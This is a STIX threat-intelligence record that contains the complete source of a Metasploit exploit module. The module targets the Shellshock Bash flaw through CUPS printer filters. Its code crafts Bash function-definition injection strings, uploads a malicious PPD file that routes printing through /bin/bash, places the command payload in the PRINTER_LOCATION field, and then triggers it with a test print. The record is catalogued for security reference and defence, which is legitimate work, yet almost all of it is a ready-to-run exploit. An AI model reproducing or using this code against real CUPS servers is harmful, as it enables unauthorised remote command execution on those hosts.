{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d07e59b0-d92d-4cb6-bd1a-97fc32fdae40",
    "created": "2024-08-14T17:07:18.180651Z",
    "modified": "2024-08-14T17:07:18.180655Z",
    "name": "CUPS Filter Bash Environment Variable Code Injection (Shellshock)",
    "description": " This module exploits the Shellshock vulnerability, a flaw in how the Bash shell handles external environment variables. This module targets CUPS filters through the PRINTER_INFO and PRINTER_LOCATION variables. A valid username and password is required to exploit this vulnerability through CUPS. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/cups_bash_env_exec.rb",
            "external_id": "cups_bash_env_exec.rb"
        },
        {
            "source_name": "lcamtuf",
            "external_id": "#CVE-2014-6278"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-6271"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-6278"
        },
        {
            "source_name": "reference",
            "url": "https://access.redhat.com/articles/1200223"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/oss-sec/2014/q3/649"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name' => 'CUPS Filter Bash Environment Variable Code Injection (Shellshock)',\n      'Description' => %q{\n        This module exploits the Shellshock vulnerability, a flaw in how the Bash shell\n        handles external environment variables. This module targets CUPS filters through\n        the PRINTER_INFO and PRINTER_LOCATION variables. A valid username and password is\n        required to exploit this vulnerability through CUPS.\n      },\n      'Author' => [\n        'Stephane Chazelas', # Vulnerability discovery\n        'lcamtuf', # CVE-2014-6278\n        'bcoles' # msf\n      ],\n      'References' => [\n        [ 'CVE', '2014-6271' ],\n        [ 'CVE', '2014-6278' ],\n        [ 'CWE', '94' ],\n        [ 'OSVDB', '112004' ],\n        [ 'EDB', '34765' ],\n        [ 'URL', 'https://access.redhat.com/articles/1200223' ],\n        [ 'URL', 'https://seclists.org/oss-sec/2014/q3/649' ]\n      ],\n      'Privileged' => false,\n      'Arch' => ARCH_CMD,\n      'Platform' => 'unix',\n      'Payload' =>\n        {\n          'Space' => 1024,\n          'BadChars' => \"\\x00\\x0A\\x0D\",\n          'DisableNops' => true,\n          'Compat' =>\n            {\n              'PayloadType' => 'cmd',\n              'RequiredCmd' => 'generic awk ruby'\n            },\n        },\n      # Tested:\n      # - CUPS version 1.4.3 on Ubuntu 10.04 (x86)\n      # - CUPS version 1.5.3 on Debian 7 (x64)\n      # - CUPS version 1.6.2 on Fedora 19 (x64)\n      # - CUPS version 1.7.2 on Ubuntu 14.04 (x64)\n      'Targets' =>  [[ 'Automatic Targeting', { 'auto' => true } ]],\n      'DefaultTarget' => 0,\n      'DisclosureDate' => '2014-09-24',\n      'License' => MSF_LICENSE,\n      'Notes' => {\n        'Stability' => [CRASH_SAFE],\n        'SideEffects' => [],\n        'Reliability' => [],\n        'AKA' => ['Shellshock']\n      }\n    ))\n    register_options([\n      Opt::RPORT(631),\n      OptBool.new('SSL', [ true, 'Use SSL', true ]),\n      OptString.new('HttpUsername', [ true, 'CUPS username', 'root']),\n      OptString.new('HttpPassword', [ true, 'CUPS user password', '']),\n      OptEnum.new('CVE', [ true, 'CVE to exploit', 'CVE-2014-6271', ['CVE-2014-6271', 'CVE-2014-6278'] ]),\n      OptString.new('RPATH', [ true, 'Target PATH for binaries', '/bin' ])\n    ])\n  end\n\n  #\n  # CVE-2014-6271\n  #\n  def cve_2014_6271(cmd)\n    %{() { :;}; $(#{cmd}) & }\n  end\n\n  #\n  # CVE-2014-6278\n  #\n  def cve_2014_6278(cmd)\n    %{() { _; } >_[$($())] { echo -e \"\\r\\n$(#{cmd})\\r\\n\" ; }}\n  end\n\n  #\n  # Check credentials\n  #\n  def check\n    @cookie = rand_text_alphanumeric(16)\n    printer_name = rand_text_alphanumeric(10 + rand(5))\n    res = add_printer(printer_name, '')\n    if !res\n      vprint_error(\"No response from host\")\n      return Exploit::CheckCode::Unknown\n    elsif res.headers['Server'] =~ /CUPS\\/([\\d\\.]+)/\n      vprint_status(\"Found CUPS version #{$1}\")\n    else\n      print_status(\"Target is not a CUPS web server\")\n      return Exploit::CheckCode::Safe\n    end\n    if res.body =~ /Set Default Options for #{printer_name}/\n      vprint_good(\"Added printer successfully\")\n      delete_printer(printer_name)\n    elsif res.code == 401 || (res.code == 426 && datastore['SSL'])\n      vprint_error(\"Authentication failed\")\n    elsif res.code == 426\n      vprint_error(\"SSL required - set SSL true\")\n    end\n    Exploit::CheckCode::Detected\n  end\n\n  #\n  # Exploit\n  #\n  def exploit\n    @cookie = rand_text_alphanumeric(16)\n    printer_name = rand_text_alphanumeric(10 + rand(5))\n\n    # Select target CVE\n    case datastore['CVE']\n    when 'CVE-2014-6278'\n      cmd = cve_2014_6278(payload.raw)\n    else\n      cmd = cve_2014_6271(payload.raw)\n    end\n\n    # Add a printer containing the payload\n    # with a CUPS filter pointing to /bin/bash\n    res = add_printer(printer_name, cmd)\n    if !res\n      fail_with(Failure::Unreachable, \"#{peer} - Could not add printer - Connection failed\")\n    elsif res.body =~ /Set Default Options for #{printer_name}/\n      print_good(\"Added printer successfully\")\n    elsif res.code == 401 || (res.code == 426 && datastore['SSL'])\n      fail_with(Failure::NoAccess, \"#{peer} - Could not add printer - Authentication failed\")\n    elsif res.code == 426\n      fail_with(Failure::BadConfig, \"#{peer} - Could not add printer - SSL required - set SSL true.\")\n    else\n      fail_with(Failure::Unknown, \"#{peer} - Could not add printer.\")\n    end\n\n    # Add a test page to the print queue.\n    # The print job triggers execution of the bash filter\n    # which executes the payload in the environment variables.\n    res = print_test_page(printer_name)\n    if !res\n      fail_with(Failure::Unreachable, \"#{peer} - Could not add test page to print queue - Connection failed\")\n    elsif res.body =~ /Test page sent; job ID is/\n      vprint_good(\"Added test page to printer queue\")\n    elsif res.code == 401 || (res.code == 426 && datastore['SSL'])\n      fail_with(Failure::NoAccess, \"#{peer} - Could not add test page to print queue - Authentication failed\")\n    elsif res.code == 426\n      fail_with(Failure::BadConfig, \"#{peer} - Could not add test page to print queue - SSL required - set SSL true.\")\n    else\n      fail_with(Failure::Unknown, \"#{peer} - Could not add test page to print queue.\")\n    end\n\n    # Delete the printer\n    res = delete_printer(printer_name)\n    if !res\n      fail_with(Failure::Unreachable, \"#{peer} - Could not delete printer - Connection failed\")\n    elsif res.body =~ /has been deleted successfully/\n      print_good(\"Deleted printer '#{printer_name}' successfully\")\n    elsif res.code == 401 || (res.code == 426 && datastore['SSL'])\n      vprint_warning(\"Could not delete printer '#{printer_name}' - Authentication failed\")\n    elsif res.code == 426\n      vprint_warning(\"Could not delete printer '#{printer_name}' - SSL required - set SSL true.\")\n    else\n      vprint_warning(\"Could not delete printer '#{printer_name}'\")\n    end\n  end\n\n  #\n  # Add a printer to CUPS\n  #\n  def add_printer(printer_name, cmd)\n    vprint_status(\"Adding new printer '#{printer_name}'\")\n\n    ppd_name = \"#{rand_text_alphanumeric(10 + rand(5))}.ppd\"\n    ppd_file = <<-EOF\n*PPD-Adobe: \"4.3\"\n*%==== General Information Keywords ========================\n*FormatVersion: \"4.3\"\n*FileVersion: \"1.00\"\n*LanguageVersion: English\n*LanguageEncoding: ISOLatin1\n*PCFileName: \"#{ppd_name}\"\n*Manufacturer: \"Brother\"\n*Product: \"(Brother MFC-3820CN)\"\n*1284DeviceID: \"MFG:Brother;MDL:MFC-3820CN\"\n*cupsVersion: 1.1\n*cupsManualCopies: False\n*cupsFilter: \"application/vnd.cups-postscript 0 #{datastore['RPATH']}/bash\"\n*cupsModelNumber: #{rand(10) + 1}\n*ModelName: \"Brother MFC-3820CN\"\n*ShortNickName: \"Brother MFC-3820CN\"\n*NickName: \"Brother MFC-3820CN CUPS v1.1\"\n*%\n*%==== Basic Device Capabilities =============\n*LanguageLevel: \"3\"\n*ColorDevice: True\n*DefaultColorSpace: RGB\n*FileSystem: False\n*Throughput: \"12\"\n*LandscapeOrientation: Plus90\n*VariablePaperSize: False\n*TTRasterizer: Type42\n*FreeVM: \"1700000\"\n\n*DefaultOutputOrder: Reverse\n*%==== Media Selection ======================\n\n*OpenUI *PageSize/Media Size: PickOne\n*OrderDependency: 18 AnySetup *PageSize\n*DefaultPageSize: BrLetter\n*PageSize BrA4/A4:\t\t\t\t\"<</PageSize[595 842]/ImagingBBox null>>setpagedevice\"\n*PageSize BrLetter/Letter:\t\t\t\"<</PageSize[612 792]/ImagingBBox null>>setpagedevice\"\nEOF\n\n    pd = Rex::MIME::Message.new\n    pd.add_part(ppd_file, 'application/octet-stream', nil, %(form-data; name=\"PPD_FILE\"; filename=\"#{ppd_name}\"))\n    pd.add_part(\"#{@cookie}\", nil, nil, %(form-data; name=\"org.cups.sid\"))\n    pd.add_part(\"add-printer\", nil, nil, %(form-data; name=\"OP\"))\n    pd.add_part(\"#{printer_name}\", nil, nil, %(form-data; name=\"PRINTER_NAME\"))\n    pd.add_part(\"\", nil, nil, %(form-data; name=\"PRINTER_INFO\")) # injectable\n    pd.add_part(\"#{cmd}\", nil, nil, %(form-data; name=\"PRINTER_LOCATION\")) # injectable\n    pd.add_part(\"file:///dev/null\", nil, nil, %(form-data; name=\"DEVICE_URI\"))\n\n    data = pd.to_s\n    data.strip!\n\n    send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'admin'),\n      'ctype' => \"multipart/form-data; boundary=#{pd.bound}\",\n      'data' => data,\n      'cookie' => \"org.cups.sid=#{@cookie};\",\n      'authorization' => basic_auth(datastore['HttpUsername'], datastore['HttpPassword'])\n    )\n  end\n\n  #\n  # Queue a printer test page\n  #\n  def print_test_page(printer_name)\n    vprint_status(\"Adding test page to printer queue\")\n    send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'printers', printer_name),\n      'authorization' => basic_auth(datastore['HttpUsername'], datastore['HttpPassword']),\n      'cookie' => \"org.cups.sid=#{@cookie}\",\n      'vars_post' => {\n        'org.cups.sid' => @cookie,\n        'OP' => 'print-test-page'\n      }\n    )\n  end\n\n  #\n  # Delete a printer\n  #\n  def delete_printer(printer_name)\n    vprint_status(\"Deleting printer '#{printer_name}'\")\n    send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'admin'),\n      'authorization' => basic_auth(datastore['HttpUsername'], datastore['HttpPassword']),\n      'cookie' => \"org.cups.sid=#{@cookie}\",\n      'vars_post' => {\n        'org.cups.sid' => @cookie,\n        'OP' => 'delete-printer',\n        'printer_name' => printer_name,\n        'confirm' => 'Delete Printer'\n      }\n    )\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-09-24",
    "x_mitre_platforms": [
        "unix'"
    ]
}